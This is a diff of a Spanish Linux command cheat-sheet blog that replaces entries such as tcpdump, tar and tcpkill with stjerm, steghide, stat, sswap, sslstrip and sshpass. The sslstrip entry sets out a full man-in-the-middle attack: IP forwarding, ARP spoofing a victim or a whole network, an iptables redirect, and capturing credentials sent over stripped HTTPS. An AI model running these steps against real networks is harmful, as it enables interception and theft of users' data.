@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Ver sexkbmap. Achivo de configuración: # nano /etc/default/keyboard XKBMODEL="pc105" XKBLAYOUT="es,de,fr,us" XKBVARIANT="cat" XKBOPTIONS="" BACKSPACE &hellip;">
+  <meta name="description" content="Consola tipo guake. $ stjerm -k f12 -s left -o 70 -h 250 -w 1280 (Que aparezca pulsando F12, con barra de escroll a la izquierda, opacidad del 70% y &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -80,7 +80,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/teclado/">Teclado</a></h1>
+      <h1 class="entry-title"><a href="/blog/stjerm/">Stjerm</a></h1>
     
     
       <p class="meta">
@@ -96,267 +96,30 @@
   
 
 
-<time datetime="2014-04-05T18:22:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Ver sexkbmap.</p>
+  <div class="entry-content"><p>Consola tipo guake.</p>
 
-<p>Achivo de configuración:</p>
-
-<blockquote><p># nano /etc/default/keyboard</p></blockquote>
-
-<pre><code>XKBMODEL="pc105"
-
-XKBLAYOUT="es,de,fr,us"
-
-XKBVARIANT="cat"
-
-XKBOPTIONS=""
-
-BACKSPACE="guess"
-</code></pre>
-
-<blockquote><p># dpkg-reconfigure keyboard-configuration</p></blockquote>
-
-<p>Reiniciar.</p>
-
-<p>1.-</p>
-
-<p>Con el paquete console-data</p>
-
-<p>Al instalar el paquete, solicita la informacion del teclado, para modificarla:</p>
-
-<blockquote><p># dpkg-reconfigure console-data</p></blockquote>
-
-<p>2.-</p>
-
-<p>En ciertas ocasiones es necesario modificar del archivo:</p>
-
-<blockquote><p># nano /etc/initramfs-tools/initramfs.conf</p></blockquote>
-
-<p>El parametro:</p>
-
-<p>KEYMAP=y</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/tcptrack/">Tcptrack</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:22:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>aplicación que muestra el consumo de la conexión.</p>
-
-<blockquote><p># tcptrack -i eth1 port 22 -f (Especificando conexión, puerto y habilitar el algoritmo de velocidad media rápida [-f])</p>
-
-<p># tcptrack -i eth1 port 21 or 80 (Especificando dos puertos)</p>
-
-<p># tcptrack -i eth0 &#8220;dst port 80&#8221; (Sólo mostrar las conexiones destinadas al puerto 80)</p>
-
-<p># tcptrack -i eth1 -r 10 -d (Mostrar las conexiones 10 segundos más de cuando se cierren, por defecto son 2 segundo [r] y sin rastrear las conexiones existentes [d])</p>
-
-<p># tcptrack -T network.pcap > network.txt (Mandando el resultado a un archivo [-T])</p></blockquote>
-
-<p>Algunas teclas de control:</p>
-
-<p>p (Pausar)</p>
-
-<p>q (salir)</p>
-
-<p>s (Cada vez que se pulsa la letra cambia a alguna de las 3 opciones de ordenación: sin ordenar (por defecto), por categoría y por bytes)</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/tcpkill/">Tcpkill</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:22:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>[dsniff)]. Matar o impedir conexiones tcp.</p>
-
-<blockquote><p># tcpkill -i eth1 host www.facebook.com (imposibilitará entrar en facebook)</p>
-
-<p># tcpkill -i eth0 host www.facebook twitter.com (especificar varias urls separadas por un espacio)</p>
-
-<p># tcpkill -i eth0 port 22 (especificando un puerto)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/tcpdump/">Tcpdump</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:22:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Capturar el trafico de la red.</p>
-
-<blockquote><p># tcpdump -D (Ver las distintas redes disponibles)</p>
-
-<p># tcpdump -nni any (Capturar todas las interfaces de red del equipo)</p>
-
-<p># tcpdump -n -i eth0 -s 1515 -w archivo (que la información se guarde en archivo)</p>
-
-<p># tcpdump -n -i eth0 -s 1515 -l | tee archivo (verlo en pantalla y que se guarde en archivo)</p>
-
-<p># tcpdump -n -r archivo -c 4 (analizar ficheros)</p>
-
-<p># tcpdump -n -r archivo udp (filtrar por protocolos - udp, tcp, icmp, arp &#8230;)</p>
-
-<p># tcpdump -n -r archivo -c 2 not tcp (con operadores booleanos [not, and]. Ver las 2 primeras capturas que no sean tcp)</p>
-
-<p># tcpdump -n -r archivo -c 2 not tcp and not udp (Ver las 2 primeras capturas que no sean tcp ni udp)</p>
-
-<p># tcpdump -n -r archivo -c 2 tpc and dst port 25 (Ver las 2 primeras capturas tcp y dst con destino al puerto 25)</p>
-
-<p># tcpdump -enni eth0 (info de la capa de enlace y MACs origen y destino)</p>
-
-<p># tcpdump host 192.168.1.3 (Capturar todo el tráfico del host especificado)</p>
-
-<p># tcpdump src net 192.168.1.0/28 (Especificando una red)</p>
-
-<p># tcpdump src host 192.168.1.3 (Solo lo que salga de la IP especificada)</p>
-
-<p># tcpdump dst port 23 (Todo el trafico que vaya dirigido al puerto 23)</p>
-
-<p># tcpdump udp and dst port 53 (Capturar tráfico de comunicación con las DNS)</p>
-
-<p># tcpdump tcp and not port 80 (Capturar todo el tráfico excepto el web)</p>
-
-<p># tcpdump tcp and port 80 (Capturar solo el web)</p>
-
-<p># tcpdump -i eth0 port not 80 and host www.google.com (Para saber si google manda “cosas” por otros puertos que no sean el 80)</p>
-
-<p># tcpdump -n -i eth1 -X tcp (Ver información del contenido de los paquetes)</p>
-
-<p># tcpdump ether src 01:20:21:00:00:B2 (Captura tráfico de la mac)</p>
-
-<p># tcpdump udp and dst port 53 (Capturar peticiones DNS)</p>
-
-<p># tcpdump tcp and (port 22 or port 23) (Capturar el tráfico telnet y ssh)</p>
-
-<p># tcpdump portrange 21-23 (tráfico origen/destino de los puertos 21, 22 o 23)</p>
-
-<p># tcpdump -n -i eth1 -X -s 200 port 9001 (de un puerto concreto)</p>
-
-<p># tcpdump -v -i eth1 port 9001 | awk &#8216;{print$1,$2,$3}&#8217;</p>
-
-<p># tcpdump port 9001 (Capturar todo el tráfico del puerto especificado)</p></blockquote>
+<blockquote><p>$ stjerm -k f12 -s left -o 70 -h 250 -w 1280 (Que aparezca pulsando F12, con barra de escroll a la izquierda, opacidad del 70% y especificando ancho y largo)</p></blockquote>
 
 <p>Algunas opciones:</p>
 
-<p>-n (Para no resolver las direcciones IP)</p>
+<p>-ah (Ocultar automáticamente la ventana cuando no está enfocada)</p>
 
-<p>-i (Indica la interfaz de red)</p>
+<p>-bg red (Color de fondo)</p>
 
-<p>-s (volumen de la parte del paquete que queremos capturar [1515 es suficiente])</p>
+<p>-bgimg imagen.png (Establecer una imagen de fondo)</p>
 
-<p>-c (cantidad de mensajes a visualizar)</p>
+<p>-fn (Tipo y tamaño de fuente)</p>
 
-<p>-p (no cambia la interfaz a modo promiscuo)</p>
+<p>-fg blue (Color de la fuente)</p>
 
-<p>-x (ver los contenidos de los paquetes)</p>
-
-<p>-r archivo (Para leer los datos de un archivo guardado con la opción -w)</p>
-
-<p>src (Dirección y puerto origen)</p>
-
-<p>dst (Dirección y puerto destino)</p>
-
-<p>1.-</p>
-
-<p>Ejemplo de un proceso:</p>
-
-<blockquote><p># tcpdump -nni eth0 &#8216;port 80&#8217; -w /tmp/port.80 (Capturar el tráfico por el puerto 80 y mandarlo a un archivo)</p>
-
-<p># tcpdump -r /tmp/port.80 -nn (Análisis básico de los datos)</p>
-
-<p># tcpdump -r /tmp/port.80 -nn &#8216;host !216.158.240.43&#8217; (Filtrar los datos descartando un host)</p>
-
-<p># tcpdump -r /tmp/port.80 -nn &#8216;host !216.158.240.43&#8217; -w /tmp/port.80.b (Lo mismo enviando los nuevos datos a otro fichero)</p></blockquote>
+<p>-p (Posición de la ventana [valores: top, bottom, left, right])</p>
 </div>
   
   
@@ -369,7 +132,7 @@ BACKSPACE="guess"
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/tar/">Tar</a></h1>
+      <h1 class="entry-title"><a href="/blog/steghide/">Steghide</a></h1>
     
     
       <p class="meta">
@@ -385,79 +148,20 @@ BACKSPACE="guess"
   
 
 
-<time datetime="2014-04-05T18:22:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Empaquetar y comprimir archivos y/o directorios.</p>
+  <div class="entry-content"><p>Detectar y extraer mensajes incrustados dentro de una imagen o música</p>
 
-<blockquote><p>$ tar -cf archivo.tar dir (Crear paquete .tar)</p>
+<blockquote><p>$ steghide embed -cf imagen.jpg -ef archivo_texto  (incrustar un texto en una imagen)</p>
 
-<p>$ tar -xf archivo.tar (Descomprimir un .tar)</p>
+<p>$ steghide embed -cf archivo.wav -ef archivo_texto (incrustar un texto en un archivo de música)</p>
 
-<p>$ tar -tf archivo.tar (Listar contenido)</p>
-
-<p>$ tar -cf archivo.tar.gz dir (Crear paquete tar.gz)</p>
-
-<p>$ tar -zf archive.tar.gz (Descomprimir paquete gzip)</p>
-
-<p>$ tar -cf archivo.tgz dir (Crear paquete .tgz)</p>
-
-<p>$ tar -xf archivo.tgz (Descomprimir un .tgz)</p>
-
-<p>$ tar -tf archivo.tgz (Listar contenido)</p>
-
-<p>$ tar -cf archive.xz dir (Crear paquete .xz)</p>
-
-<p>$ tar -xf archive.xz (Descomprimir paquete . xz)</p>
-
-<p>$ tar -cf archivo.tbz dir (Empaquetar y comprimir)</p>
-
-<p>$ tar -xf archivo.tbz (Desempaquetar y descomprimir)</p>
-
-<p>$ tar -tf archivo.tbz (Ver contenido)</p>
-
-<p>$ tar -cf archivo.tar.bz2 dir (Crear paquete .tar.bz2)</p>
-
-<p>$ tar -xf archivo.tar.bz2 (Descomprimir archivo .tar.bz2)</p></blockquote>
-
-<p>Opciones:</p>
-
-<pre><code>-z (Comprimir archivos usando gzip)
-
--c (Crear un nuevo archivo)
-
--v (mostrar proceso)
-
--f (archivo (nombre de archivo)
-
--x (extraer el contenido del archivo comprimido)
-
--t (listar contenido de un archivo)
-
--j  (comprime el fichero tar con bzip2)
-</code></pre>
-
-<p>Otros casos:</p>
-
-<blockquote><p>$ tar -cf - file/ | gpg -c > file.cript (empaquetar y encriptar un archivo)</p>
-
-<p>$ tar -c ficheros | bzip2 > archivo.tar.bz2 (Empaquetar ficheros y comprimir)</p>
-
-<p>$ tar -cvzf archivo.tar.gz /home/usuario &#8211;exclude=videos (Empaquetar el directorio del usuario exluyendo el directorio videos)</p>
-
-<p>$ tar -cvfz archivo.tgz &#8211;exclude=&#8221;home/usuario/Descargas&#8221; /home/usuario/* (Lo mismo de otra forma)</p>
-
-<p>$ tar -cvzf archivo.tar.gz –exclude={*.iso,videos} /home/usuario (Otra forma de empaquetar el direcotorio del usuario excluyendo todas las iso y la carpeta videos)</p>
-
-<p>$ tar -jxf archivo.tbz -C /tmp (Descomprimir en otra carpeta)</p>
-
-<p>$ tar -cvfz archivo.tgz &#8211;exclude=&#8221;home/usuario/Descargas&#8221; &#8211;exclude=”home/usuario/videos /home/usuario/* (Otra forma de especificar las carpetas excluidas)</p>
-
-<p>$ tar -czf - Images | ssh 192.168.1.15 &#8216;cat > ~/Images.tar.tgz&#8217; (Crear un tar de un directorio y mandarlo a un host remoto por ssh donde creará en el directorio personal el paquete Images.tar.gz)</p></blockquote>
+<p>$ steghide extract -sf imagen.jpg  (extraer el archivo incrustado)</p></blockquote>
 </div>
   
   
@@ -470,7 +174,7 @@ BACKSPACE="guess"
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/talk/">Talk</a></h1>
+      <h1 class="entry-title"><a href="/blog/status/">Status</a></h1>
     
     
       <p class="meta">
@@ -486,18 +190,16 @@ BACKSPACE="guess"
   
 
 
-<time datetime="2014-04-05T18:22:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Entablar conversaciones con usuarios conectados a nuestro sistema o remotos</p>
+  <div class="entry-content"><p>Verifica si un servicio está activo o no.</p>
 
-<blockquote><p>$ talk usuario ttyx  (Conectar con usuarios locales)</p>
-
-<p>$ talk usuario@IP_o_Host (Con un usuario remoto [UNIX])</p></blockquote>
+<blockquote><p>$ status ssh</p></blockquote>
 </div>
   
   
@@ -510,7 +212,7 @@ BACKSPACE="guess"
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/tail/">Tail</a></h1>
+      <h1 class="entry-title"><a href="/blog/stat/">Stat</a></h1>
     
     
       <p class="meta">
@@ -526,24 +228,24 @@ BACKSPACE="guess"
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>muestra las últimas 10 lineas de un fichero (si no se especifica otra cantidad)</p>
+  <div class="entry-content"><p>Estadísticas de archivo, directorios y sistemas</p>
 
-<blockquote><p># tail /var/log/apache2/access.log</p>
+<blockquote><p># stat /etc/passwd</p>
 
-<p># tail -f /var/log/apache2/access.log (Actualiza los logs cada segundo)</p>
+<p># stat /usr</p>
 
-<p># tail -50 /var/log/apache2/access.log  (muestra las últimas 50)</p>
+<p># stat -f /</p>
 
-<p># tail -f /var/log/httpd/access_log /var/log/fail2ban.log (Abrir dos archivos)</p>
+<p>$ stat -c &#8220;%s&#8221; archivo (medida del archivo)</p>
 
-<p># tail -s 5 archivo.log (Actualiza cada 5 segundos)</p></blockquote>
+<p>$ stat -c &#8216;%n %U:%G-%a&#8217; * (Mostrar nombre archivo, propietario, grupo y permisos)</p></blockquote>
 </div>
   
   
@@ -556,7 +258,7 @@ BACKSPACE="guess"
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/tac/">Tac</a></h1>
+      <h1 class="entry-title"><a href="/blog/startx/">Startx</a></h1>
     
     
       <p class="meta">
@@ -572,16 +274,16 @@ BACKSPACE="guess"
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Muestra el fichero por consola, al revés. De la última linea a la primera</p>
+  <div class="entry-content"><p>Arrancar sistema gráfico</p>
 
-<blockquote><p>$ tac archivo.txt</p></blockquote>
+<blockquote><p>$ startx &#8211; :1 (una segunda sesión gráfica accesible en ^Alt + F8)</p></blockquote>
 </div>
   
   
@@ -594,7 +296,7 @@ BACKSPACE="guess"
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/sysv-rc-conf/">Sysv-rc-conf</a></h1>
+      <h1 class="entry-title"><a href="/blog/stalonetray/">Stalonetray</a></h1>
     
     
       <p class="meta">
@@ -610,16 +312,40 @@ BACKSPACE="guess"
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Gestionar el arranque de las aplicaciones al inicio.</p>
+  <div class="entry-content"><p>Applet para albergar el area de notificación.</p>
 
-<blockquote><p># sysv-rc-conf</p></blockquote>
+<blockquote><p>$ stalonetray -bg #A78B5C -d title -geometry 6x1-0+0 -i 30 (con el color especificado [-bg], decoración de ventana [-d], las medidas [6x1] y la situación en pantalla [-0+0, abajo, derecha])</p></blockquote>
+
+<p>Algunas opciones:</p>
+
+<p>-d  (none, title, border, all)</p>
+
+<p>situación:</p>
+
+<p>Abajo a la izquierda    5x1+0-0</p>
+
+<p>Abajo en el centro (1024x768) + 20 píxeles elevado 5x1-450-20</p>
+
+<p>Abajo a la derecha  5x1-0-0</p>
+
+<p>Arriba a la izquierda   5x1+0+0</p>
+
+<p>Arriba a la izquierda + 20 píxeles descendido  5x1+0+20</p>
+
+<p>Arriba en el centro (1024x768)  5x1+450+0</p>
+
+<p>Arriba a la derecha 5x1-0+0</p>
+
+<p>Arriba a la derecha + 20 píxeles descendido    5x1-0+20</p>
+
+<p>Abajo a la izquierda + 20 píxeles elevado  5x1+0-20</p>
 </div>
   
   
@@ -632,7 +358,7 @@ BACKSPACE="guess"
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/system-config-printer/">System-config-printer</a></h1>
+      <h1 class="entry-title"><a href="/blog/st/">St</a></h1>
     
     
       <p class="meta">
@@ -648,16 +374,158 @@ BACKSPACE="guess"
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Gestión de impresoras. Lanza la gui.</p>
+  <div class="entry-content"><p>Terminal simple.</p>
 
-<blockquote><p>$ system-config-printer</p></blockquote>
+<blockquote><p>$ st -t Reiniciar -e sudo init 6 (Abrir un terminal st con título para entrar la contraseña y reiniciar)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sswap/">Sswap</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>[secure-delete]. Borrado seguro de swap. Previamente desactivar con swapoff /dev/sda7 y al finalizar el proceso volver a activarla con swapon /dev/sda7 [Si no sabemos donde se encuentra la swap: cat /proc/swaps. Argumentos paracidos a srm [ver] y sfill [ver]. El espacio se sobreescribe 38 veces.</p>
+
+<blockquote><p>$ sswap -f /dev/sda7 (Modo rápido e inseguro)</p>
+
+<p>$ sswap -lv /dev/sda7 (Como lanzar dos veces sswap -f y mostrando el proceso)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sslstrip/">Sslstrip</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP].</p>
+
+<p>Configuración de reenvío de paquetes IP:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Envenenamiento ARP (paquete dsniff):</p>
+
+<blockquote><p># arpspoof -i eth0 -t ip_victima ip_router</p></blockquote>
+
+<p>En caso de querer atacar toda la red, solo especificar la ip router:</p>
+
+<blockquote><p># arpspoof -i eth0 ip_router</p></blockquote>
+
+<p>Redirección de puertos usando Iptables:</p>
+
+<blockquote><p># iptables -t nat -A PREROUTING -p tcp &#8211;destination-port 80 -j REDIRECT &#8211;to-ports 31715</p></blockquote>
+
+<p>Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar &#8220;-A&#8221; por un &#8220;-D&#8221; en el comando anterior.</p>
+
+<p>Arrancar sslstrip y ponerlo a la escucha:</p>
+
+<blockquote><p># sslstrip -k -f -l 31715 -w archivo.log</p></blockquote>
+
+<p>Visionar en tiempo real los paquetes capturados:</p>
+
+<blockquote><p>#  tail -f archivo.log</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sshpass/">Sshpass</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>La contraseña para acceder por ssh a un host remoto se realiza de forma interactiva (entrándola por teclado) en algunos casos esto no es posible ya sea por tratarse de un script en el que se entra en un host remoto, se realiza alguna acción y se regresa al local o por que se precisa entrar la contraseña de forma no interactiva. Para estos casos puede ser útil este comando aunque considerando lo debil para la seguridad que entraña su uso ya que puede quedar registrado en &#8220;history&#8221;.</p>
+
+<blockquote><p>$ sshpass -f file_pas ssh -y usuario@host ifconfig (Ejecuta ifconfig en el remoto entrando como contraseña la primera palabra del archivo file_pas )</p>
+
+<p>$ sshpass -p 1234 ssh -t usuario@host &#8220;echo 1234 | sudo -S namp 192.168.1.0/24&#8221; (Ejecuta el comando &#8220;sudo nmap&#8221; en el host remoto que tiene por contraseña 1234.)</p></blockquote>
 </div>
   
   
@@ -688,43 +556,43 @@ BACKSPACE="guess"
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/nmap/">nmap</a>
+        <a href="/blog/zypper/">zypper</a>
       </li>
     
       <li class="post">
-        <a href="/blog/nethogs/">nethogs</a>
+        <a href="/blog/zmore/">zmore</a>
       </li>
     
       <li class="post">
-        <a href="/blog/lilo/">lilo</a>
+        <a href="/blog/zmap/">zmap</a>
       </li>
     
       <li class="post">
-        <a href="/blog/anarchism/">anarchism</a>
+        <a href="/blog/zless/">zless</a>
       </li>
     
       <li class="post">
-        <a href="/blog/sftp/">sftp</a>
+        <a href="/blog/zip/">zip</a>
       </li>
     
       <li class="post">
-        <a href="/blog/logrotate/">logrotate</a>
+        <a href="/blog/zgrep/">zgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/ssh/">ssh</a>
+        <a href="/blog/zfgrep/">zfgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/lshell/">lshell</a>
+        <a href="/blog/zenity/">zenity</a>
       </li>
     
       <li class="post">
-        <a href="/blog/apt-mirror/">apt-mirror</a>
+        <a href="/blog/zegrep/">zegrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/typeset/">typeset</a>
+        <a href="/blog/zdump/">zdump</a>
       </li>
     
   </ul>
